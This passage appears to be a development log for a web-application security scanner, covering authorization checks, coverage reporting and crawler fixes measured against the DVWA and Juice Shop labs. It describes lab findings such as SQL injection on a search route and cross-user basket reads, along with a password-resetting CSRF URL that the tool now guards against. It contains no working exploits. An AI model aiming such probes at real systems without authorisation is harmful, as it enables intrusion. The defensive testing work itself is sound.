Verified against the real run: neither the marker, the bare email, nor a bearer token appears in
any stored payload or in the export body. A refused check records nothing, because zero rows
from a refusal is indistinguishable from a clean result.

> "The marker never travels" was written as a product-wide property, here and in
> `docs/integrations.md`, and it is not one — E-032 records the per-path decision and
> `docs/integrations.md` now carries the table. `SecurityAssertion` and the catalogue's marker
> evaluators quote it deliberately, because there the quotation is the proof and the reader is
> the data's owner. The one place it must never reach is `recon_context`, and it did.

**Two gaps the work exposed, both pre-existing, both fixed.** `finding_payload` dropped `cwe`
entirely — findings have carried one since the ZAP adapter began recording `alert["cweid"]` and it
never reached DefectDojo, so its CWE reporting was empty for every erlik import. And `coverage()`'s
`verified` state was reachable ONLY from `answered`, i.e. only when a catalogue case had probed the
pair; a cross-arm finding does not come out of a case, so the operation carrying a HIGH `confirmed`
privilege crossing was reported `not_run` — outstanding work, on the pair the lane was most sure
about. A finding now outranks every other state and says when no case probed the pair. Measured,
`verified` went 6 to 8.

Fourteen clauses ablated, all fourteen measured. Two of my own tests were initially unablatable and
were rewritten to be: one whose marker ablation was a no-op comment, and one that exercised only
the `not_attempted` branch of the coverage change.

**Two verified defects are named rather than fixed, because both need lane plumbing.**
The anonymous stage cannot carry application configuration (`service.py` passes `None` for
it and the proxy then injects nothing), so on an application whose configuration lives in a
cookie the anonymous arm is evaluated against a DIFFERENT application — measured on DVWA,
273 bytes with `security=low` versus 41 bytes without it. And `service.authenticate` is a
status-and-marker probe rather than a differential one, with `expected_status` defaulting to
200, so an identity whose check URL is the target origin passes while carrying nothing. Both
were fixed in Increment 9 below, where the first turned out to be a measured false positive in
this increment's own check rather than only a caveat.

**One stale claim of my own was corrected.** `AUTHZ-04_idor.yaml` carried a verdict table
asserting `security=low -> FINDING` and `security=medium -> FINDING` on DVWA's authbypass
endpoint. Re-measured: the case reports NOTHING there at any level, and that is right — once
`config_cookie` put the security level on every arm, the ANONYMOUS arm receives the same
273-byte user table, so the endpoint is missing authentication rather than broken
authorization. The table was measured before `config_cookie` existed and was never
re-measured after. The stale row is kept in the comment rather than deleted, because it is
exactly the hazard this project keeps finding.

**Increment 6 — the identity matrix, and the boundary it does not cross.** The slice
sentence opens with "an operator selects two lab identities", and by now every later
clause was built: the hidden API operation is discovered (Increment 4), its coverage is
visible (Increment 5), a seeded authorization flaw reproduces (the `ownership`
evaluator), and its evidence opens. What was missing is the declaration that makes the
rest mean something.

`Identity` gained `role`, `tenant`, `subject_id` and `may_access` — all
operator-declared, none a secret, each validated as text that reaches a command template
and an evidence quote. `contracts.identity_target_fields` carries the non-secret ones
into a case's target dict, and `compare_arms` reports the roles and tenants so
`cross_tenant` is something a reader sees rather than infers from two opaque handles.

`subject_id` is the one the authorization checks rest on, and putting it on the identity
rather than in a per-run target dict is the point: it travels with the ARM, so two arms
cannot share one by accident, and the asymmetry that makes the `ownership` evaluator safe
— the caller's identity from the operator, the asserted owner from the target — is
expressed where an operator can see it. A check worth confirming before building on it:
`secret_values` is an explicit allow-list rather than a sweep, so the declarations survive
into a finding's evidence. Had it swept every string, the ownership finding's own
comparison would have been redacted out of the evidence that quotes it.

**And the increment stopped at a measured boundary rather than shipping past it.** A lane
stage carries exactly ONE identity — it resolves it from its own row, and the proxy
authenticates that stage as it — while the `ownership` evaluator needs three arms in one
case execution. I wrote a lane-runnable `WSTG-AUTHZ-04.2` to prove the matrix out, then
deleted it: it named an `owner_step` and an `anonymous_step` it had no way to have, so it
could never fire. A case that always reports nothing is worse than no case, and it is the
exact unwired shape E-027 had just been fixed for.

So `subject_id` reaching a case is groundwork, not a working lane check, and two tests pin
that so a future reader does not assume otherwise. The lane-native shape is a comparison
ACROSS stages, which `compare_arms` already does for surfaces and does not yet do for
responses — **that is what Increment 7 should build**, and it is the remaining half of
E-011.

**Increment 5 — make coverage answerable, before and after.** The slice sentence asks
that an operator "sees its coverage", and §E-010 gives the cost of not being able to: at
the default budget the 2026-09-10 run tested one or two parameters per case out of eight
and lost six of nine findings, saying so only in per-case observations nobody reads
before launching. Everything needed was already recorded — `test_case`,
`test_case_not_run`, `test_case_truncated`, `test_case_unreachable`, `parameter_refused`,
`form_url_withheld` — and scattered across stage results, so the question an operator
actually has had no answer. The same shape as the schema digest in E-030: recorded, never
read.

`inventory.coverage` aggregates it per (pair, identity) with a state and a reason, and
`inventory.preview` answers the same question before the run using
`deterministic.target_budget` — the runner's own arithmetic, extracted to module level so
there is one definition rather than two claims. Both are exposed as
`/sessions/{id}/coverage` and `/sessions/{id}/preview`.

**There is no `tested` state, and that is the point.** `answered` means bytes came back;
it is not proof the check exercised anything, because a DVWA probe missing its CSRF token
answers HTTP 200 with 389 bytes of PHP warnings. `verified` — a finding came out of it —
is the only state the lane can stand behind. `not_run` and `not_attempted` are likewise
kept apart: the first says a bigger `max_urls` covers it, the second says nothing
selected tests it and no budget changes that.

**Three of my own errors were caught by making the two views agree**, which is the whole
argument for building them as a pair:

- Matching observations to endpoint rows literally credited **2 of 13** probes that
  actually ran — because `parameters_by_url` hands a case the query-stripped URL while
  the row keeps its query. A report claiming six times less coverage than the run
  delivered sends an operator chasing gaps that are not there. The preview predicted 13
  correctly, which is how the disagreement surfaced.
- Normalising both sides without grouping then credited **57**, because twenty crawled
  variants of one path each claimed the same probe. The unit of work is the probeable
  pair, not the endpoint row; `inventory.probe_key` defines it once for both views.
- A case-wide budget truncation was being applied to every pair in the inventory,
  labelling 41 pairs `not_run` on a run where no selected case was eligible for them at
  all. A case-wide record now applies only to pairs that case could have tested.

And one label of mine was misleading rather than wrong: `not_reached` sums per-case
shortfalls, so it counts case-targets rather than distinct pairs — several cases usually
share a pair. It now says so, and reports `distinct_pairs` beside it.

**Increment 4 — reach the surface the crawler was missing.** No fourth increment was
written down; this is the work §12's own measurements call the binding constraint:
*detection works and discovery does not reach*. On Juice Shop the lane reported 136
endpoints, 4 parameters and 2 findings, both informational, while the application's
error-based SQL injection sat one request away.

**The plan's diagnosis of why was wrong, and measuring it is what found that.** §2
said "the parameter is one JS-body extractor away from being in the inventory". It was
not. The route was out of reach because **the rendered pass was failing outright**: its
landing navigation waited for `networkidle` with a fatal timeout, and an Angular front
end that polls never goes idle — `Page.goto: Timeout 30000ms exceeded`. Worse, `rpc`
raises, so the exception left the adapter and took the whole katana stage with it,
discarding a crawl that would have reported 133 endpoints. E-029 had just made that
path run for every authenticated assessment rather than on request, so the blast radius
had grown.

Idle is now an optimisation rather than a requirement — `domcontentloaded` is the floor,
with a bounded extra wait so late XHRs still fire — and a rendered pass that fails
anyway becomes a `rendered_pass_failed` observation with the stage marked `partial`,
leaving the fetched crawl intact. On Juice Shop that took the pass from **0 to 122
observed endpoints**, and the browser then saw the search XHR itself.

**What that bought, measured end to end:**

    before   136 endpoints, 4 parameters, 2 findings (robots.txt, security.txt)
    after    145 endpoints, 7 parameters, and

             [high] WSTG-INPV-05.2  /rest/products/search (q)
                    982 bytes of evidence carrying the application's own
                    `SQLITE_ERROR: near "probe": syntax error`

**The JavaScript extractor is still worth having, and for a smaller reason than the
plan claimed.** `contracts.infer_endpoints` reads routes out of a script body and
resolves relative ones against the script's own URL, which is how Juice Shop spells its
open redirect (`url:"./redirect?to=..."`). Of the five routes it recovers from
`main.js`, two are found by nothing else — `/rest/user/change-password?current=` and
`/rest/user/security-question?email=` — because the application never calls them on the
landing page. Katana finds neither, and does not find the search route either.

**Every route it returns is target-controlled text about to become a URL the lane
requests and a parameter name it injects into**, so the refusals are the substance: one
leading slash and never two (the same bundle names `//w.soundcloud.com/player/?url=`,
which resolves to a different host); no scheme, no `..`, and a path charset that cannot
carry a `${id}` placeholder or open an argv; parameter names held to `PARAMETER_NAME`;
a fragment refuses the whole candidate rather than truncating it, because `?ok=1&a#b=2`
cut at the `#` yields the name `a` the application never had.

And **an inferred route is a proposal, never a target.** It is recorded as
`source="javascript"` and withheld from `seeds()` and `parameters_by_url()`, so nothing
fetches or probes it until an operator selects it. The reason is in the same five rows:
`/rest/products/search?q=` and `/rest/user/change-password?current=` are syntactically
indistinguishable, and the second is a real mutating endpoint — it answers 401
anonymously, so authentication is the only thing between the lane and a changed
credential while it enumerates. Surfacing a route no crawler reaches is the value;
requesting it unasked is how a tool changes a password by accident.

**Increment 3, first part — the R0 isolation gate and object-level authorization.**

`contracts.operation_key` keys an operation on **what can be injected into it** —
origin, path, method and the testable parameter names — and deliberately not on the
companion query. That query is where DVWA's single-use `user_token` lived, and it
was the whole of the measured divergence. `inventory.operations()` groups the
endpoint rows beneath their operation without discarding any, and
`inventory.compare_arms()` is the comparison E-008 asks for.

**The gate is not met by normalisation, and an independent pass is why this
paragraph does not say it is.** Making the arms agree about the operation set was
my first answer and it is only half of one: agreeing about what exists is not
having tested it. A live run was measured scoring a perfect shared-surface fraction
of **1.0 while all eight probe sets received zero bytes** — the arms agreed
completely and neither reached anything. So `compare_arms` refuses four things
rather than reporting set equality, each because a run gave a wrong answer without
it: the two arms being one identity; an operation only one arm saw; an operation
both arms saw **at different concrete URLs**; and no shared operations at all.

That third clause is the one the operation key itself introduces, and it refuses
the historical DVWA pair: the arms now agree about the operation and still issued
different requests, because the hardened arm carried a token. Companion values are
withheld from the output — the divergence is reported as the differing query
FIELDS, since a value is target-controlled text.

`comparable` therefore means "these two arms describe the same surface", and the
returned record says so in as many words. Reach is a property of execution that
this function cannot see, and §E-030 records that the lane's own emptiness detector
does not fire on a refusal either: a DVWA probe refused for want of a token answers
HTTP 200 with 389 bytes of PHP warnings, which is not empty and is not an answer.

Measured independently, with real Chromium in the worker image against real DVWA
under two logged-in sessions differing only in the `security` cookie: the arms move
from **1 of 8 shared (url, parameter) pairs to 6 of 8**, and both residuals are
genuine application differences rather than artifacts (§E-030).

Three measurements decided the design, and none of them is what reading the code
would suggest:

- DVWA's token is **single-use, and a consumed one is answered with zero bytes** —
  4757 bytes on first use, 0 on the second. That is the cause of the 156-of-208
  empty steps on the hardened arm, and it means the fix is not "refresh the token"
  but "do not put the value in the identity at all".
- **No token at all returns 389 bytes of PHP warning**, not zero. So omitting a
  volatile companion makes the failure visible rather than invisible — a real
  improvement, because the lane can then report `test_case_unreachable` instead of
  clean — but it does NOT make the hardened arm testable. Neither request reaches
  the SQL.
- Therefore **DVWA's `security` cookie is the wrong second identity for an
  authorization differential**, whatever it is worth for a surface comparison: the
  hardened arm's zero findings are vacuous, because it never executed the code
  being compared. Two principals at one level are the right pair — measured, admin
  and gordonb both at `security=low` produce `/vulnerabilities/sqli/?Submit=Submit`
  byte for byte, so the only variable is who made the request.

E-011's object-level half is a new `ownership` evaluator, built on that last point.
It asks whether the application ITSELF attributes the object to somebody other than
the caller, which is a sharper question than the existing `idor` evaluator's body
comparison can ask of an API — every JSON response carries ids and timestamps, so
two identities never produce identical bytes and a hash differential is noise.

Four clauses, each verified load-bearing by removing it and watching its own tests
fail: the caller gets the object and an owner IS asserted; that owner is not the
caller's **operator-declared** id; the declared owner can read it too; and an
anonymous request is refused. The asymmetry is the safety property — who the caller
is comes from the operator, the asserted owner comes from the target, so a target
can cost itself coverage and cannot manufacture a finding.

Validated against Juice Shop v17.1.1 with two seeded principals, and against a
fixture written to forge ownership:

    jim (2) reads admin's basket 1     FINDING     anon refused 401
    admin (1) reads jim's basket 2     FINDING     anon refused 401
    each reading their OWN basket      no finding  caller owns it
    GET /rest/basket/99999             no finding  200 + {"data":null}
    GET /api/Products                  no finding  asserts no owner
    a fixture asserting UserId 1 to
      everyone, anonymous included     no finding  published, not leaked

That last row is the clause that stops a target choosing its own finding. Without
it the lane reports a critical authorization leak on content the application
publishes deliberately.

**Two live defects fixed on the way, both the same shape as ones already fixed:**

- `inventory.seeds()` applied no source filter, and `ZapAdapter.run` passes its
  output into a ZAP **requestor** job — a list of URLs ZAP is told to GET. So
  `/vulnerabilities/csrf/?Change=Change`, which sets DVWA's admin password to the
  md5 of an empty string, was still reachable. It had been fixed twice, at the two
  call sites known about; the guard now lives in the producer, so a fourth caller
  is safe by default and has to ask to be unsafe.
- The typed `idor` evaluator compared `low_priv_token != high_priv_token`. On a
  cookie-authenticated application both are None, `None != None` is False, and the
  evaluator could never fire on the one lab target the project measures against.
  Same bearer-only assumption AUTHZ-04's YAML case was already corrected for — the
  fix had reached the case and not the code beside it.
- `form_endpoint` bounded its companion query with a character slice, which cut the
  last pair mid-value and dropped the submit control entirely. A 700-byte hidden
  field produced a probe carrying a value the application never emitted, unable to
  reach the handler. Bounded by whole pairs now, submit control first.

**Not done, and deliberately:** E-007's full schema (operations, observations and
coverage tables with attempted/verified/blocked states), E-010's preview, and the
function-level half of E-011. E-027 to E-030 record what the audit found and did
not fix, with the measurements.

## 13. Decisions to revisit before expansion

Planning defaults: web/API assessments first; self-hosted services; single operator;
operator-assisted login; local processing of sensitive inputs; explicit external
exports. Automated SSO refresh, team access, distributed workers, bidirectional
DefectDojo triage, and infrastructure-wide testing remain deferred decisions.

Before committing to later releases, establish which user segment matters most
(internal application team, consultancy, or research lab), available engineering
capacity, typical application/authentication patterns, evidence retention needs,
and whether source repositories are normally available. Use those answers and the
measured coverage gaps to choose the next integration rather than tool popularity.
